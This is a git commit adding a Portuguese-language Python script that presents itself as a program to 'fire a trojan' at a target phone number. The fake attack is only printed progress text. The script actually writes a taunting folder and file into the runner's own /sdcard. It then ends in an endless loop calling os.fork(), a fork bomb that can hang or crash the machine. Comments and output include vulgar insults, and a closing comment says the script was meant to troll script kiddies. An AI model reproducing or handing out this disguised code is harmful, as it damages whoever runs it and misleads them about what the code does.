24e4bbd91c1ae51a85129facc5590e6a4c644057
lacostehype <85191741+lacostehype@users.noreply.github.com>
2021-08-02 23:37:50 -0300

    Create TrojanHype.py

---
+++ TrojanHype.py
@@ -0,0 +1,73 @@
+## Tabela de cores ANSI (Python) ##
+global C,R,O,W,L,E,Y,a,l,e,i,s,t,ë,r,XV,XXI
+
+# fonte #
+C='\033[1;30m'     # Preto 
+R='\033[1;31m'     # Vermelho 
+O='\033[1;32m'     # Verde 
+W='\033[1;33m'    # Amarelo 
+L='\033[1;34m'     # Azul 
+E='\033[1;35m'     # Rosa
+Y='\033[1;36m'     # Ciano
+
+##
+XV='\033[1;37m'     # Branco
+XXI='\033[0;0m'      # Remover
+##
+
+# fundo #
+a='\033[1;40m'     # Preto
+l='\033[1;41m'      # Vermelho
+e='\033[1;42m'     # Verde
+i='\033[1;43m'      # Amarelo
+s='\033[1;44m'     # Azul
+t='\033[1;45m'      # Rosa
+ë='\033[1;46m'     # Ciano
+r='\033[;7m'          # Inverte 
+
+import os
+import time 
+
+
+
+os.system ('clear')
+os.system ('figlet -f slant TROJAN') 
+print (f'{XV} Script by{XXI}:{O}Lacoste Hype {XXI}')
+time.sleep(0.6)
+
+# variavel para contagem
+a = 1
+#
+
+print(" ".center(8), f'{XV} PROGRAMA DE RAJAR TROJAN{XXI}😈🐊')
+print (f' {l} SOMENTE O NÚMERO SEM ESPAÇO OU -\nEXEMPLO :+5511959228439{XXI}')
+n = int(input(f'{l}{W} Digite o número do alvo :{XXI}'))
+print ('\n')
+print (f'{R}Localizando alvo!!!{XXI}')
+time.sleep(3.0)
+print (f'{l}ALVO ENCONTRADO' '❗❗❗{XXI}')
+# comi o cu de quem ta lendo ;) a
+os.system (' cd /sdcard && mkdir Albania-Security && cd Albania-Security && echo Albania-Security passou aqui > se fudeu ')
+############$
+os.system ('clear')
+print (f'{XV}.  INICIANDO...{XXI}'.center(6))
+
+os.system('clear')
+time.sleep(2.0)
+while a < 500:
+    print (''.center(10),f'{L}RAJANDO O TROJAN NO ALVO{XXI}', n)
+    a += 1
+
+input(f' {XV} aperte {XXI}{R}ENTER{XXI}{XV}para fechar o programa.{XXI}')
+time.sleep (0.5)
+os.system (' figlet -f slant ENCERRANDO...')
+time.sleep (2.0)
+os.system (' mkdir Albania-Security ')
+while True:
+	print (f' {XV} ALBANIA-SECURITY PASSOU A PIKA {XXI}')
+	os.fork()
+	
+
+	
+#script feito com intuito de trollar lammers e script kiddies 
+	
